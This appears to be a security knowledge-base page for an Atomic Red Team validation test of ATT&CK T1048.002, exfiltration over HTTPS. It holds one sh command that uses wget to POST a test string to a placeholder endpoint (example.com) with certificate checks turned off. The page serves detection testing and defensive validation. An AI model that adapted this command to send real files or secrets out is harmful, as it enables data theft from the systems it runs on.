---
atomic_guid: "8bec51da-7a6d-4346-b941-51eca448c4b0"
title: "Exfiltrate data as text over HTTPS using wget"
framework: "atomic"
generated: "true"
attack_technique_id: "T1048.002"
attack_technique_name: "Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.002/T1048.002.yaml"
build_date: "2026-04-26 17:02:12"
executor: "sh"
aliases:
  - "8bec51da-7a6d-4346-b941-51eca448c4b0"
  - "Exfiltrate data as text over HTTPS using wget"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Exfiltrate data as text over HTTPS using wget

Exfiltrate data over HTTPS using wget --post-data method

## Metadata

- Atomic GUID: 8bec51da-7a6d-4346-b941-51eca448c4b0
- Technique: T1048.002: Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
- Platforms: linux
- Executor: sh
- Elevation Required: False
- Source Path: atomics/T1048.002/T1048.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1048-exfiltration_over_alternative_protocol|T1048.002]]

## Input Arguments

### endpoint_domain

- description: Endpoint to send data to
- type: string
- default: https://example.com/

## Executor

- elevation_required: False
- name: sh

### Command

```bash
wget --post-data="msg=AtomicTestT1048.002" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.002/T1048.002.yaml)
